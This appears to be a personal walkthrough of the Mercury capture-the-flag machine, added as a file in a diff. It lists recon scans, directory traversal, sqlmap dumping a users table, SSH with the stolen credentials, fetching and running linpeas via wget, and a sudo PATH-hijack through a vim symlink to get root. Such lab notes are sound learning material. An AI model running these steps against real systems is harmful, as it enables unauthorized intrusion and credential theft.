@@ -1,0 +1,101 @@
+MERCURY CTF
+----------------------
+--> netdiscover 10.0.2.0/24 [returns 4 results. IP of the target machine is 10.0.2.6]
+--> nmap -p- -sV -oN MRK.txt 10.0.2.6 [we have 2 services running. HTTP Proxy on 8080 and OpenSSH on 22]
+
+*** Check if there is website running on the box ***
+
+--> 10.0.2.6 [returns unable to load page error]
+
+*** retry with the proxy port 8080 ***
+
+10.0.2.6:8080 [opens an under construction site >> nothing useful]
+
+*** use serachsploit to look for exploits that can be used ***
+*** both  services returned no useable exploits ***
+*** Try searching for directories using dirb ***
+
+--> dirb http://10.0.2.6:8080/ [uses common.txt wordlist to scan the URL] [returns 1 file robots.txt]
+
+*** opening robots.txt on browser returns nothing useful. TRy something like directory traversal attacks ***
+
+--> http://10.0.2.6:8080/../../../../../etc [returns a result with 3 choices of which 1 could be a directory with something useful >> "mercuryfacts/"]
+
+*** try openong that directory on the browser ***
+
+--> http://10.0.2.6:8080/mercuryfacts/ [returns a webpage with 2 links]
+
+*** second link mentions authentication was achieved using users table in the website DB which is mysql ***
+*** Use SQLMap to try and access the db using sql injection ***
+
+--> sqlmap -u http://10.0.2.6:8080/mercuryfacts/1 --dbs
+							  [--dbs option is used to discover databased once sql map confirms that the site is vulnerable to sql injection]
+							  [we get 2 database as the output -- information_schema and mercury]
+							  
+--> sqlmap -u http://10.0.2.6:8080/mercuryfacts/1 --tables -D {mercury} {information_schema}  [Mercury returts 2 tables users and facts]
+							  *** dump the data from users ***
+
+--> sqlmap -u http://10.0.2.6:8080/mercuryfacts/1 --dump -D mercury -T users [we get a list of usernames and passwords]
+
+*** since we have an openssh running on port 22 we can try ssh with the user ids ***
+
+--> ssh webmaster@10.0.2.6 [enter the password for webmasetr]
+
+*** ssh was successful ***
+
+--> ls -lrt [returns a directory and user_flag.txt]
+--> cat user_flag.txt []
+--> cd mercury_proj 
+--> ls -lrt [returns a bunch of options. and a txt file notes.txt]
+--> cat notes.txt [we get information about 2 project accounts. looks like user id and password but the password is hashed and needs to be
+                   cracked? maybe ?]
+				   
+*** encoding used here is base64 which can be cracked using hurl or a base64 decoding site https://base64decode.net. ***
+*** we can check if the encoding is base 64 by  ****
+		^^ number of characters is a multiple of 4
+		^^ ends with a padding of 0, 1 or 2 '=' characters
+		^^ characters used are [A-Z] [a-z] [0-9] [+] [/]
+		
+--> su linuxmasetr [enter decoded password]
+--> cd /root [doesnt work]
+
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+*** we might have to privilege escalate. We can use linpeas script for this ***
+
+--> git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
+
+
+*** Transfer the file to linuxmaster ***
+
+--> cd tmp
+--> python -m SimpleHTTPServer 8000 [run on local system]
+--> wget http://10.0.2.15:8000/linpeas_base.sh [save into /tmp]
+--> chmod +x linpeas_base.sh
+-->./linpeas_base.sh [**** THrowing error at line 470 ****]
+
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+--> sudo -l [list all files that linusmaster can run as root]
+
+*** we can run /usr/bin/sheck_syslog.sh as root in a preserve environment because of the SETENV tag ***
+
+--> cat check_syslog.sh
+
+*** it is a bash script that runs tail command to check the syslog ***
+*** exploit the environment path variable by symlink the vim editor through the tail command to get a bash shell in /home/linuxmaster ***
+
+--> ln -s /usr/bin/vim tail
+--> export PATH=$(pwd):$PATH
+
+*** run in a preserved environment ***
+
+--> sudo --preserve-env=PATH /usr/bin/check_syslog.sh
+--> :!/bin/bash [hit enter and we have root shell]
+--> cd /root
+--> cat root_flag.txt
+
+
+
+
+
